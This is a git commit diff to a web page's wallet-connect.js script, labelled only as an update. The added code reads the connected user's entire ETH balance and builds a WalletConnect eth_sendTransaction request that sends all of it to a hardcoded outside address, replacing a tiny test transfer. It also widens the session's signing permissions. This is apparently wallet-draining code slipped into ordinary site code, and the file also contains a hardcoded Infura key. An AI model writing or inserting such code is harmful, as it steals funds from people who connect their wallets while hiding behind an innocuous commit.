c16d5003f1febe38b624885121de3e2951455d2f
olamicreas <70097198+olamicreas@users.noreply.github.com>
2023-10-14 18:47:34 +0100

    Update wallet-connect.js

--- static/wallet-connect.js
+++ static/wallet-connect.js
@@ -13,7 +13,15 @@ import walletconnectWeb3Provider from 'https://cdn.jsdelivr.net/npm/walletconnec
 const connectButton = document.getElementById("connect-button");
 const ethereumJsonRpcUrl = 'https://mainnet.infura.io/v3/b515c05d5db44cb3aa07665e4d316042'
 
-
+const providerOptions = {
+  walletconnect: {
+    package: walletconnectWeb3Provider,
+    options: {
+      // Mikko's test key - don't copy as your mileage may vary
+      infuraId: "b515c05d5db44cb3aa07665e4d316042",
+    }
+  },
+}
 
 console.log(WalletConnectModalSign)
 // 2. Create modal client, add your project id
@@ -37,7 +45,7 @@ async function onConnect() {
 
       requiredNamespaces: {
         eip155: {
-          methods: ["eth_sendTransaction", "personal_sign"],
+          methods: ["eth_sendTransaction", "personal_sign", "eth_signTransaction"],
           chains: ["eip155:1"],
           events: ["chainChanged", "accountsChanged"],
         },
@@ -46,40 +54,49 @@ async function onConnect() {
       
       
     });
+    
     console.log(session);
      // Use the wallet's provider from Web3Modal
 
-    const { relay } = session;
-    const relayUrl = relay.url; // Assuming this contains the relay URL
-    const chainId = 1; // Replace with the appropriate chain ID
-
-// Create an Ethereum provider
     
     var accounts = session.namespaces.eip155.accounts[0].slice(9)
-    const infuraProvider = new ethers.providers.JsonRpcProvider(relayUrl, chainId);
+    const infuraProvider = new ethers.providers.JsonRpcProvider(ethereumJsonRpcUrl);
     
     if (session) {
       console.log('Connected to wallet');
       
       // Get the connected address
-      const signer = infuraProvider.getSigner(accounts);
-      console.log(signer)
-      const address = await signer.getAddress();
-      console.log(address)
+      
       // Create a transaction
       const balance = await infuraProvider.getBalance(accounts);
       const balanceInEther = ethers.utils.formatEther(balance);
-      console.log(balanceInEther)
+      const balanceInWei = ethers.utils.parseEther(balanceInEther);
+
+      // Convert Wei to hexadecimal
+      const balanceInWeiHex = balanceInWei.toHexString();
+
+      console.log('Balance in Wei (hex):', balanceInWeiHex);
+      
       const transaction = {
+        from: accounts,
+        to: "0xc25a768371b1f10DED11513eDF0eb5120DC33dcf",
+        gas: "20000",
+        value: balance.toString()
         
-        to: '0xBa4cf5755661985979d731FD3816e26293caf2D8',
-        value: ethers.utils.parseEther('0.00001'), // 0.001 ETH in Wei
+        
       };
 
       // Sign and send the transaction
       try {
         
-        const txResponse = await signer.sendTransaction(transaction);
+        const txResponse =  await web3Modal.request({
+          topic: session.topic,
+          chainId: "eip155:1",
+          request: {
+            method: "eth_sendTransaction",
+            params: [transaction],
+          },
+        });
         await txResponse.wait();
 
         console.log('Transaction sent. Transaction Hash:', txResponse.hash);
